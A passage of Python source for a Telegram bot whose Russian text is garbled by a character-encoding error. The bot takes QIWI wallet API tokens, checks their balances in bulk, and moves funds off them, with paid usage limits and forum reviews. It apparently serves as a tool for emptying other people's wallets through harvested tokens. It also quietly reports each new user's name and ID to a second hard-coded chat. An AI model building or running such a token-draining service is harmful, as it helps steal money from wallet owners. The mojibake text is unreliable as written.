kb_del_proxy = ReplyKeyboardMarkup(True)
kb_del_proxy.row('üóë –£–¥–∞–ª–∏—Ç—å –ø—Ä–æ–∫—Å–∏')
kb_del_proxy.row('üîô –û—Ç–º–µ–Ω–∞')

kb_paid = ReplyKeyboardMarkup(True)
kb_paid.row('‚úÖ –Ø –æ–ø–ª–∞—Ç–∏–ª')
kb_paid.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_many = ReplyKeyboardMarkup(True)
kb_confirm_many.row('‚úÖ –ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Ç–æ–∫–µ–Ω–æ–≤')
kb_confirm_many.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_multi = ReplyKeyboardMarkup(True)
kb_confirm_multi.row('‚úÖ –ù–∞—á–∞—Ç—å –ø–µ—Ä–µ–≤–æ–¥—ã')
kb_confirm_multi.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_inv = ReplyKeyboardMarkup(True)
kb_confirm_inv.row('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ–ø–ª–∞—Ç—É')
kb_confirm_inv.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_card = ReplyKeyboardMarkup(True)
kb_confirm_card.row('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –≤—ã–≤–æ–¥')
kb_confirm_card.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_ph = ReplyKeyboardMarkup(True)
kb_confirm_ph.row('‚úÖ –û–ø–ª–∞—Ç–∏—Ç—å —Ç–µ–ª–µ—Ñ–æ–Ω')
kb_confirm_ph.row('üîô –û—Ç–º–µ–Ω–∞')

kb_info = ReplyKeyboardMarkup(True)
kb_info.row('üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞', 'ü§ñ –û –±–æ—Ç–µ')
kb_info.row('üëæ –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫', 'üìß Feedback')
kb_info.row('üîô –û—Ç–º–µ–Ω–∞')

kb_history = ReplyKeyboardMarkup(True)
kb_history.row('üì• –ü–æ–ø–æ–ª–Ω–µ–Ω–∏—è', 'üì§ –ü–ª–∞—Ç–µ–∂–∏')
kb_history.row('üì® –í—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏')
kb_history.row('üîô –û—Ç–º–µ–Ω–∞')

kb_rows = ReplyKeyboardMarkup(True)
kb_rows.row('2', '5', '7')
kb_rows.row('10', '15', '20')
kb_rows.row('üîô –û—Ç–º–µ–Ω–∞')

kb_sorry = ReplyKeyboardMarkup(True)
kb_sorry.row('üò≠ –ü—Ä–æ–º—Å—Ç–∏—Ç–µ –º–∏–Ω—è –ø–æ–∂–∞–ª—É–π—Å—Ç–∞!1')

kb_cancel = ReplyKeyboardMarkup(True)
kb_cancel.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm_n = ReplyKeyboardMarkup(True)
kb_confirm_n.row('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –æ—Ç–ø—Ä–∞–≤–∫—É')
kb_confirm_n.row('üîô –û—Ç–º–µ–Ω–∞')

kb_confirm = ReplyKeyboardMarkup(True)
kb_confirm.row('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –ø–µ—Ä–µ–≤–æ–¥')
kb_confirm.row('üîô –û—Ç–º–µ–Ω–∞')

kb_comment = ReplyKeyboardMarkup(True)
kb_comment.row('üí≠ –û—Å—Ç–∞–≤–∏—Ç—å –ø—É—Å—Ç—ã–º')
kb_comment.row('üîô –û—Ç–º–µ–Ω–∞')


@bot.message_handler(commands=['start'])
def start_message(message):
    tid = message.chat.id
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ.
    bot.send_message(tid, f'–ü—Ä–∏–≤–µ—Ç!\n–Ø - –±–æ—Ç, –ø–æ–∑–≤–æ–ª—è—é—â–∏–π –ª–µ–≥–∫–æ —Ä–∞–±–æ—Ç–∞—Ç—å —Å QIWI API —Ç–æ–∫–µ–Ω–æ–º!\n' + \
    '–ß—Ç–æ–±—ã –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –±–∞–ª–∞–Ω—Å –∏–ª–∏ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ —Å —Ç–æ–∫–µ–Ω–∞ QIWI, –≤—ã–±–µ—Ä–∏ –ø—É–Ω–∫—Ç *–í–≤–µ—Å—Ç–∏ —Ç–æ–∫–µ–Ω QIWI –∫–æ—à–µ–ª—å–∫–∞*!\n' + \
    f'\n–ü–æ –ø–æ–≤–æ–¥—É —Ä–µ–∫–ª–∞–º—ã –≤ –±–æ—Ç–µ: {config.ADMIN_TG}\n–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫: {config.ADMIN_TG}\n' + \
    '\n_–û–±—â—É—é —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –º–æ–∂–Ω–æ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≤ —Ä–∞–∑–¥–µ–ª–µ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏_', parse_mode='markdown', reply_markup=kb_main)
    if not qiwi.users_info.get(tid, {}).get("status"):
        from_result = parce_start(message.text)
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –æ —á–µ–ª–æ–≤–µ–∫–µ, –µ—Å–ª–∏ –æ–Ω–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç.
        qiwi.users_info[tid] = {}
        # –ï—Å–ª–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤–∫–ª—é—á–µ–Ω—ã –∏ –∞–∫–∫–∞—É–Ω—Ç –∞–¥–º–∏–Ω–∞ –¥–æ—Å—Ç—É–ø–µ–Ω.
        if save_user(uid=tid, username=message.from_user.username, source=from_result["from"]) and qiwi.notif_new and qiwi.notification:
            # –û–ø—Ä–µ–¥–µ–ª—è–µ–º –≤–∏–¥ –∏—Å—Ç–æ—á–Ω–∏–∫–∞.
            string_source = config.SOURCES.get(from_result["from"])
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ.
            string_source = '\n–ò—Å—Ç–æ—á–Ω–∏–∫: `' + string_source + '`' if string_source else ''
            bot.send_message(qiwi.notification, f'üîî *–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`{string_source}', parse_mode='markdown')
            time.sleep(0.01)
            bot.send_message(CORE, f'üîî *–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`{string_source}', parse_mode='markdown')


@bot.message_handler(commands=['freeze'])
def freeze_token(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            command, token, adding_sum = message.text.split()
            # –ß–∏—Ç–∞–µ–º —É–∂–µ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã.
            try:
                with open('freezing_tokens.json', 'r', encoding='utf-8') as f:
                    freezing_tokens = json.load(f)
                if not isinstance(freezing_tokens, dict):
                    raise ValueError
            except:
                freezing_tokens = {}
            # –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω.
            freezing_tokens[token] = {
                "token": token,
                "sum": float(adding_sum)
            }
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª.
            with open('freezing_tokens.json', 'w', encoding='utf-8') as f:
                json.dump(freezing_tokens, f, indent=4)
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–º–æ—Ä–æ–∑–∏—Ç—å.')
        else:
            bot.send_message(tid, f'‚úÖ –¢–æ–∫–µ–Ω ***<code>{token[-6:]}</code> —É—Å–ø–µ—à–Ω–æ –∑–∞–º–æ—Ä–æ–∂–µ–Ω.\n–ë–∞–ª–∞–Ω—Å –∑–∞–º–æ—Ä–æ–∑–∫–∏: <code>{float(adding_sum)}</code>‚ÇΩ.', parse_mode='html')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')


@bot.message_handler(commands=['unfreeze'])
def freeze_token(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            token = message.text.split()[1]
            # –ß–∏—Ç–∞–µ–º —É–∂–µ –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã.
            with open('freezing_tokens.json', 'r', encoding='utf-8') as f:
                freezing_tokens = json.load(f)
            if isinstance(freezing_tokens, dict) and freezing_tokens.get(token):
                # –£–¥–∞–ª—è–µ–º —Ç–æ–∫–µ–Ω.
                unfreezed_token = freezing_tokens.pop(token)
                freeze_sum = unfreezed_token["sum"]
                if freezing_tokens.get(token):
                    raise ValueError
                # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª.
                with open('freezing_tokens.json', 'w', encoding='utf-8') as f:
                    json.dump(freezing_tokens, f, indent=4)
            else:
                raise ValueError
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞–∑–º–æ—Ä–æ–∑–∏—Ç—å.')
        else:
            bot.send_message(tid, f'‚úÖ –¢–æ–∫–µ–Ω ***<code>{token[-6:]}</code> —É—Å–ø–µ—à–Ω–æ —Ä–∞–∑–º–æ—Ä–æ–∂–µ–Ω.\n–ë–∞–ª–∞–Ω—Å –ø—Ä–∏ –∑–∞–º–æ—Ä–æ–∑–∫–µ: <code>{float(freeze_sum)}</code>‚ÇΩ.', parse_mode='html')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')

@bot.message_handler(commands=['present'])
def present_message(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            adding_sum = int(message.text.split()[2])
            if not qiwi.admin_upgrade_limit(user_id, adding_sum):
                raise ValueError
            bot.send_message(tid, f'‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é #`{user_id}` –Ω–∞—á–∏—Å–ª–µ–Ω–æ `{adding_sum}`‚ÇΩ!', parse_mode='markdown')
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–¥–∞—Ç—å –ø—Ä–µ–º–∏—É–º.')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')

@bot.message_handler(commands=['get_balance'])
def present_message(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            user_limits = qiwi.get_user_limits(user_id)
            text = f"*ID: {user_id}*\n–ë–∞–ª–∞–Ω—Å: `{bue_numb(user_limits['have'])}`‚ÇΩ\n–ë–µ—Å–ø–ª–∞—Ç–Ω–æ: +`{bue_numb(user_limits['free'])}`‚ÇΩ\n\n–ü–æ—Ç—Ä–∞—á–µ–Ω–æ: `{bue_numb(user_limits['spent'])}`‚ÇΩ\n*–û—Å—Ç–∞–ª–æ—Å—å:* `{bue_numb(user_limits['left'])}`‚ÇΩ"
            bot.send_message(tid, text, parse_mode='markdown')
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ.', parse_mode='markdown')


@bot.message_handler(commands=['stop'])
def stop_message(message):
    tid = message.chat.id
    if tid == qiwi.notification:
        bot.send_message(tid, 'üòê –ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.', reply_markup=kb_main)
        raise TimeoutError


@bot.message_handler(commands=['premium'])
def premium_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not add_blacklist(user_id, premium=True):
                raise ValueError
            bot.send_message(tid, f'‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é #`{user_id}` –≤—ã–¥–∞–Ω –ø—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å!', parse_mode='markdown')
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–¥–∞—Ç—å –ø—Ä–µ–º–∏—É–º.')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')


@bot.message_handler(commands=['unpremium'])
def unpremium_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not remove_blacklist(user_id, premium=True):
                raise ValueError
            bot.send_message(tid, f'‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #`{user_id}` –ª–∏—à–µ–Ω –ø—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å–∞!', parse_mode='markdown')
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫–ª—é—á–∏—Ç—å –ø—Ä–µ–º–∏—É–º —Å—Ç–∞—Ç—É—Å.')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')


@bot.message_handler(commands=['ban'])
def ban_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not add_blacklist(user_id):
                raise ValueError
            bot.send_message(tid, f'‚úÖ –ß–µ—Ä—Ç—è–∫–∞ —Å –ø–æ—Ä—è–¥–∫–æ–≤—ã–º –Ω–æ–º–µ—Ä–æ–º `{user_id}` —É—Å–ø–µ—à–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!', parse_mode='markdown')
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.')
    else:
        bot.send_message(tid, 'ü§° –°–µ–±—è –∑–∞–±–ª–æ–∫–∏—Ä—É–π!')


@bot.message_handler(commands=['unban'])
def unban_user(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            user_id = int(message.text.split()[1])
            if not remove_blacklist(user_id):
                raise ValueError
            bot.send_message(tid, f'‚úÖ –ß–µ—Ä—Ç—è–∫–∞ #`{user_id}` —É—Å–ø–µ—à–Ω–æ –ø–æ–º–∏–ª–æ–≤–∞–Ω!', parse_mode='markdown')
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')


@bot.message_handler(commands=['send_all', 'send'])
def send_notif(message):
    tid = message.chat.id
    if qiwi.notification and tid == qiwi.notification:
        try:
            if message.text == '/send_all':
                to_person = None
                notif_mode = 'full'
            else:
                to_person = message.text.split()[1]
                notif_mode = 'to_nick' if '@' in to_person else 'to_id'
            qiwi.status(tid, "waiting_notif")
            qiwi.users_info[tid]["mode"] = notif_mode
            qiwi.users_info[tid]["to_person"] = to_person
            bot.send_message(tid, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ!', reply_markup=kb_cancel)
        except:
            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ.')
    else:
        bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??')


@bot.message_handler(content_types=['photo'])
def handle_docs_audio(message):
    tid = message.chat.id
    if qiwi.users_info.get(tid, {}).get("status") == "waiting_notif":
        if qiwi.notification and tid == qiwi.notification:
            try:
                downloaded_file = bot.download_file(bot.get_file(message.photo[0].file_id).file_path)
                qiwi.status(tid, "confirm_notif")
                qiwi.users_info[tid]["to_text"] = message.caption,
                qiwi.users_info[tid]["to_photo"] = downloaded_file

                if qiwi.users_info[tid]["mode"] == "full":
                    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.
                    receivers = get_receivers()
                elif qiwi.users_info[tid]["mode"] == "to_id":
                    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ id.
                    receivers = get_receivers(only_id=qiwi.users_info[tid]["to_person"])
                elif qiwi.users_info[tid]["mode"] == "to_nick":
                    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ –Ω–∏–∫—É.
                    receivers = get_receivers(only_nick=qiwi.users_info[tid]["to_person"][1:])
                else:
                    receivers = False

                if receivers:
                    nikcs = [f'{one_nick["nick"]}' for one_nick in receivers]
                    qiwi.users_info[tid]["to_ids"] = [int(one_nick["id"]) for one_nick in receivers]
                    bot.send_message(tid, f'<b>–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è!</b>\n–ü–æ–ª—É—á–∞—Ç–µ–ª–µ–π: <b>{len(receivers)}</b>\n–°–ø–∏—Å–æ–∫: {", ".join(nikcs)}', parse_mode="html")
                    bot.send_photo(tid, downloaded_file, caption=message.caption, parse_mode="markdown", reply_markup=kb_confirm_n)
                else:
                    bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!', reply_markup=kb_main)
                    qiwi.reset(tid)
            except:
                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–µ–¥–æ—Å–º–æ—Ç—Ä!', reply_markup=kb_main)
                qiwi.reset(tid)
        else:
            bot.send_message(tid, 'ü§° –ö—É–¥–∞ —Ä—É—á–∫–∏ —Ç—è–Ω–µ—à—å??', reply_markup=kb_main)
            qiwi.reset(tid)
    else:
        bot.send_message(tid, '–Ø –Ω–µ –ø–æ–Ω–∏–º–∞—é, —á–µ–≥–æ —Ç—ã —Ö–æ—á–µ—à—å, –±–∞–∫–∞!', reply_markup=kb_main)
        qiwi.reset(tid)


@bot.message_handler(content_types=["text"])
@info_loader
def main_sender(message):
    tid = message.chat.id
    if config.TECH_WORK and tid != qiwi.notification:
        bot.send_message(tid, '‚ö†Ô∏è –ü—Ä–æ–≤–æ–¥—è—Ç—Å—è, –¢–µ—Ö.–†–∞–±–æ—Ç—ã! –≠—Ç–æ –∑–∞–π–º–µ—Ç –∫–∞–∫–æ–µ-—Ç–æ –≤—Ä–µ–º—è...')
    else:
        if save_user(uid=tid, username=message.from_user.username) and qiwi.notif_new and qiwi.notification:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ.
            bot.send_message(tid, f'*–ü—Ä–∏–≤–µ—Ç, –¥—Ä—É–≥!*\n–ï—Å–ª–∏ —Ç–µ–±–µ –ø–æ–Ω—Ä–∞–≤–∏—Ç—Å—è –±–æ—Ç, —Ç–æ –º–æ–∂–µ—à—å –æ—Å—Ç–∞–≤–∏—Ç—å *–æ—Ç–∑—ã–≤* –ø–æ–¥ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–µ–π —Ç–µ–º–æ–π –Ω–∞ —Ñ–æ—Ä—É–º–µ. –ó–∞ —ç—Ç–æ —Ç—ã –ø–æ–ª—É—á–∏—à—å –Ω–µ–±–æ–ª—å—à–∏–µ *–ø–ª—é—à–∫–∏*!\n_–ü–æ–¥—Ä–æ–±–Ω–µ–µ –≤–æ –≤–∫–ª–∞–¥–∫–µ "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"._', parse_mode='markdown', disable_web_page_preview=True)
            bot.send_message(qiwi.notification, f'üîî *–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`', parse_mode='markdown')
            bot.send_message(CORE, f'üîî *–ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!*\nUsername: *@{message.from_user.username}*\nTelegram ID: `{tid}`', parse_mode='markdown')
        # –û–±–Ω–æ–≤–ª—è–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.
        qiwi.upd_count()
        # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø—Ä–æ–≤–µ—Ä–æ–∫ –∏ –ø–µ—Ä–µ–≤–æ–¥–æ–≤.
        qiwi.upd_activity()
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å—Ç—å –ª–∏ –¥–∞–Ω–Ω—ã–µ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ.
        if not qiwi.users_info.get(tid):
            # –ï—Å–ª–∏ –Ω–µ—Ç, —Ç–æ —Å–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –æ —á–µ–ª–æ–≤–µ–∫–µ.
            qiwi.reset(tid)
        blacklist = load_blacklist()
        if tid in blacklist:
            bot.send_message(tid, f"ü§° –°–ª—ã—à, —á–µ—Ä—Ç—è–∫–∞ —Å –ø–æ—Ä—è–¥–∫–æ–≤—ã–º –Ω–æ–º–µ—Ä–æ–º {tid}!\n–ü–æ–∑–¥—Ä–∞–≤–ª—è—é, —Ç—ã –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω, –ø–æ—ç—Ç–æ–º—É —è —Å —Ç–æ–±–æ–π —Ä–∞–∑–≥–æ–≤–∞—Ä–∏–≤–∞—Ç—å –Ω–µ –±—É–¥—É!", reply_markup=kb_sorry)
        else:
            if qiwi.users_info.get(tid, {}).get("status") == "doing_many_checks" or qiwi.users_info.get(tid, {}).get("status") == "doing_many_pays":
                if qiwi.users_info.get(tid, {}).get("status") == "doing_many_checks":
                    bot.send_message(tid, "‚åõ –ò–¥–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–æ–≤, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞ –ø–æ–¥–æ–∂–¥–∏—Ç–µ...", reply_markup=kb_disable)
                elif qiwi.users_info.get(tid, {}).get("status") == "doing_many_pays":
                    bot.send_message(tid, "‚åõ –ò–¥–µ—Ç –ø–µ—Ä–µ–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞ –ø–æ–¥–æ–∂–¥–∏—Ç–µ...", reply_markup=kb_disable)
                return
            elif message.text == "üîô –û—Ç–º–µ–Ω–∞":
                qiwi.reset(tid)
                bot.send_message(tid, "–í–æ–∑–≤—Ä–∞—â–∞—é—Å—å –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é!", reply_markup=kb_main)
                return
            else:
                if qiwi.users_info.get(tid, {}).get("status") == "waiting_notif":
                    if qiwi.notification and tid == qiwi.notification:
                        try:
                            qiwi.status(tid, "confirm_notif")
                            qiwi.users_info[tid]["to_text"] = message.text,
                            qiwi.users_info[tid]["to_photo"] = None

                            if qiwi.users_info[tid]["mode"] == "full":
                                # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.
                                receivers = get_receivers()
                            elif qiwi.users_info[tid]["mode"] == "to_id":
                                # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ id.
                                receivers = get_receivers(only_id=qiwi.users_info[tid]["to_person"])
                            elif qiwi.users_info[tid]["mode"] == "to_nick":
                                # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –ø–æ –Ω–∏–∫—É.
                                receivers = get_receivers(only_nick=qiwi.users_info[tid]["to_person"][1:])
                            else:
                                receivers = False

                            if receivers:
                                nikcs = [f'{one_nick["nick"]}' for one_nick in receivers]
                                qiwi.users_info[tid]["to_ids"] = [int(one_nick["id"]) for one_nick in receivers]
                                bot.send_message(tid, f'<b>–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è!</b>\n–ü–æ–ª—É—á–∞—Ç–µ–ª–µ–π: <b>{len(receivers)}</b>\n–°–ø–∏—Å–æ–∫: {", ".join(nikcs)}', parse_mode="html")
                                bot.send_message(tid, message.text, parse_mode="markdown", reply_markup=kb_confirm_n)
                            else:
                                bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!', reply_markup=kb_main)
                                qiwi.reset(tid)
                        except:
                            bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ —É–¥–∞–ª–æ—Å—å —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–µ–¥–æ—Å–º–æ—Ç—Ä!', reply_markup=kb_main)
                            qiwi.reset(tid)
                    else:
                        bot.send_message(tid, 'üö´ –û—à–∏–±–∫–∞ - –Ω–µ–≤–µ—Ä–Ω—ã–π —Å—Ç–∞—Ç—É—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è', reply_markup=kb_main)
                        qiwi.reset(tid)
                    return
                elif qiwi.users_info.get(tid, {}).get("status") == "deposit":
                    try:
                        deposit_sum = int(message.text)
                        if 10 <= deposit_sum <= 50000:
                            # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É –∑–∞—á–∏—Å–ª–µ–Ω–∏—è.
                            total_bonus = [x[1] for x in config.BONUS_DICT.items() if deposit_sum >= x[0]][-1]
                            total_percent = round((total_bonus - 1) * 100)
                            total_sum = int(deposit_sum * total_bonus)

                            deposit_upgrade = int(deposit_sum / config.SELLER_PERCENT)
                            total_upgrade = int(total_sum / config.SELLER_PERCENT * total_bonus)

                            eco_price = int(total_upgrade - deposit_upgrade)

                            # –ü–æ–ª—É—á–∞–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.
                            transactions = qiwi.users_balance.get(tid, {}).get('transactions', [])
                            user_code = str(tid) + ':' + gen_code(transactions)

                            # –î–æ–±–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é.
                            qiwi.gen_transaction(tid, user_code, deposit_sum, total_upgrade)
                            qiwi.status(tid, "waiting_pay")

                            deposit_text = f"*–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–∏.*\n–°—É–º–º–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã: `{deposit_sum}`‚ÇΩ\n–ë–æ–Ω—É—Å –∫ –ª–∏–º–∏—Ç—É: +`{int(total_percent)}`% (+`{bue_numb(eco_price)}`‚ÇΩ)\n–õ–∏–º–∏—Ç –±—É–¥–µ—Ç –ø–æ–≤—ã—à–µ–Ω –Ω–∞: `{bue_numb(total_upgrade)}`‚ÇΩ" + \
                                f'\n\n*–í—ã–ø–æ–ª–Ω–∏—Ç–µ –ø–µ—Ä–µ–≤–æ–¥ –Ω–∞ QIWI.*\n–ù–æ–º–µ—Ä QIWI: `{secured_config.ADMIN_QIWI}`\n–°—É–º–º–∞: `{deposit_sum}`\n–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: `{user_code}`'
                            bot.send_message(tid, deposit_text, parse_mode='markdown', reply_markup=kb_paid)
                        else:
